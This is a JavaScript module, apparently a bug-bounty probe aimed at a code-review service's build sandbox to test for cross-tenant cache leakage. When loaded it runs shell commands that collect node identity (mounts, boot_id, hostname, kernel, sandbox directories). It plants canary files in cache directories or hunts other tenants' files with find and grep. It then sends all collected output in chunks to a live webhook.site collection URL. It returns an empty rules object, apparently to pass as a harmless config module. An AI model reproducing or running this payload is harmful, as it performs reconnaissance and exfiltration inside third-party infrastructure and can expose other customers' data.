// TENANTCACHE battery — authorized CodeRabbit VDP research (own orgs B + C3 only).
// Purpose: the Critical cross-tenant discriminator. Mode tcplant:
//   "tcplant" = org B run plants TC_B1_6e0333e9 canaries into the CARRIED classes
//               (~/.cache, /tmp, npm store dir, GOCACHE, GOMODCACHE) + a fake dep-cache entry.
//   "tcread"  = org C3 (different tenant) run HUNTS for TC_B1_6e0333e9 anywhere + records node identity.
// Node identity (pool /ssd/N, overlay uuid, boot_id, kernel, shared-dir listing) is captured in BOTH
// modes so the reader can prove same-node vs different-node (conclusiveness gate).
// Values never captured: secrets/tokens/foreign names — redacted 4ch/shape only. REDACTED.
module.exports = function tcBattery() {
  const OAST = "https://webhook.site/128cbeca-d2ff-499c-a497-a94e30d7ae54";
  const MODE = "tcplant";
  const TOK = "TC_B1_6e0333e9";          // e.g. TC_B1_a1b2c3d4  (pre-shared across both runs)
  const RUN = "tcb";          // run tag for OAST reassembly: tcb / tcc
  const cp = require("child_process");
  const fs = require("fs");
  const os = require("os");
  const path = require("path");
  const cl = (s, n) => String(s == null ? "" : s).replace(/[\s\n\r]+/g, " ").replace(/[;|,]/g, "~").slice(0, n || 160);
  const redact = (s) => String(s == null ? "" : s)
    .replace(/(gh[pousr]_[A-Za-z0-9]{4})[A-Za-z0-9]*/g, "$1...R")
    .replace(/(github_pat_[A-Za-z0-9]{4})[A-Za-z0-9_]*/g, "$1...R")
    .replace(/(sk-[A-Za-z0-9]{4})[A-Za-z0-9_-]*/g, "$1...R")
    .replace(/(https?:\/\/[^:\/@\s]{4})[^@\/\s]*@/g, "$1...R@")
    .replace(/\b(?:\d{1,3}\.){3}\d{1,3}\b/g, (m) => m.split(".").slice(0, 2).join(".") + ".x.x");
  const OUT = [];
  const add = (s) => OUT.push(s);
  const t0 = Date.now();

  const run = (cmd) => {
    try {
      const o = cp.execSync(cmd, { timeout: 25000, env: Object.assign({}, process.env, { GIT_TERMINAL_PROMPT: "0" }) });
      return { rc: 0, out: o.toString() };
    } catch (e) {
      const out = ((e.stdout || "") + " " + (e.stderr || e.message || "")).toString();
      return { rc: e.status == null ? -1 : e.status, out };
    }
  };

  add("TENANT mode=" + MODE + " tok=" + TOK + " t0=" + t0 + " node=" + process.version);

  // ---- N: NODE IDENTITY (both modes) — the conclusiveness gate ----
  const mt = run("mount | grep -E 'ssd|upperdir|chroot-template' | head -3");
  add("N1 mount:" + cl(mt.out, 360));
  const poolnum = (String(mt.out).match(/\/ssd\/([0-9]+)/) || [])[1] || "NA";
  add("N1 pool=/ssd/" + poolnum);
  const pools = run("ls -d /ssd/* 2>/dev/null | head -20; echo NP_none");
  add("N2 pools:" + cl(pools.out, 200));
  const boot = run("cat /proc/sys/kernel/random/boot_id 2>/dev/null; echo ---; cat /etc/hostname 2>/dev/null; echo ---; hostname 2>/dev/null");
  add("N3 boot:" + cl(boot.out, 120));
  const kern = run("cat /proc/sys/kernel/osrelease 2>/dev/null");
  add("N4 kernel:" + cl(kern.out, 40));
  const shared = run("find /ssd -maxdepth 3 -name 'nsjail-*' -type d 2>/dev/null | head -8; echo done");
  add("N5 ssd_shared:" + cl(shared.out, 240));

  // ---- D: dependency/cache dir resolve ----
  const home = os.homedir();
  const tmp = os.tmpdir();
  const npmDir = process.env.npm_config_store_dir || path.join(home, ".npm");
  const gocache = process.env.GOCACHE || path.join(home, ".cache/go-build");
  const gomod = process.env.GOMODCACHE || path.join(home, "go/pkg/mod");
  add("D dirs:npm=" + cl(npmDir, 60) + " gocache=" + cl(gocache, 60) + " gomod=" + cl(gomod, 60));

  // planted paths (name -> [abs, class])
  const marks = [
    [path.join(home, ".cache", "tc_marker"), "homecache"],
    [path.join(tmp, "tc_marker"), "tmpdir"],
    [path.join(home, ".cache", "tc_marker_dep"), "homedep"],
    [path.join(npmDir, "tc_marker_npm"), "npmstore"],
    [path.join(gocache, "tc_marker_gocache"), "gocache"],
    [path.join(gomod, "tc_marker_gomod"), "gomod"],
    [path.join(home, ".cache", "tc-fake-dep-" + TOK.split("_").pop(), "package.json"), "fakedep"],
  ];

  if (MODE === "tcplant") {
    for (const [p, tag] of marks) {
      try {
        fs.mkdirSync(path.dirname(p), { recursive: true });
        fs.writeFileSync(p, TOK + "\n");
        const st = fs.statSync(p);
        add("P planted " + tag + " mtime=" + st.mtimeMs + " size=" + st.size);
      } catch (e) {
        add("P plant " + tag + " ERR " + cl(e.message, 60));
      }
    }
  } else {
    // tcread: hunt for TOK across the whole reachable FS
    for (const [p, tag] of marks) {
      try {
        const st = fs.statSync(p);
        const body = fs.readFileSync(p, "utf8").slice(0, 32);
        add("R EXACT " + tag + " mtime=" + st.mtimeMs + " body=" + cl(body, 32));
      } catch (e) {
        add("R absent " + tag);
      }
    }
    const fn = run("find /home /tmp /root /var /opt /ssd /mnt -maxdepth 6 \\( -name 'tc_marker*' -o -name 'TC_B1*' -o -name 'tc-fake-dep*' \\) 2>/dev/null | head -20");
    add("R find_names:" + cl(fn.out, 300));
    const fg = run("grep -rl '" + TOK + "' /home /tmp /root /var 2>/dev/null | head -20");
    add("R grep_tok:" + cl(fg.out, 300));
    const hunt = run("find /home /tmp -maxdepth 4 -name 'cp_canary*' -o -name 'CP6A-*' 2>/dev/null | head -8");
    add("R cphunt(prior run canaries):" + cl(hunt.out, 160));
    // node-wide blind sweep: any tenant canaries on reachable cache dirs
    const sweep = run("ls -la '" + home + "/.cache' 2>/dev/null | head -20");
    add("R homecache_ls:" + cl(sweep.out, 300));
  }

  add("T_END t_end=" + Date.now() + " elapsed_ms=" + (Date.now() - t0));

  // ================= exfil (chunked OAST GETs) =================
  const payload = OUT.join("\n");
  const chunks = [];
  for (let i = 0; i < payload.length; i += 450) chunks.push(payload.slice(i, i + 450));
  try {
    const https = require("https");
    const fire = (i) => {
      if (i >= chunks.length) return;
      const u = OAST + "?t=" + RUN + "-" + MODE + "-" + i + "&d=" + encodeURIComponent(chunks[i]);
      try {
        https.get(u, (res) => { res.resume(); fire(i + 1); }).on("error", () => fire(i + 1));
      } catch (e) { fire(i + 1); }
    };
    fire(0);
  } catch (e) { /* ignore */ }

  return { rules: {} };
};
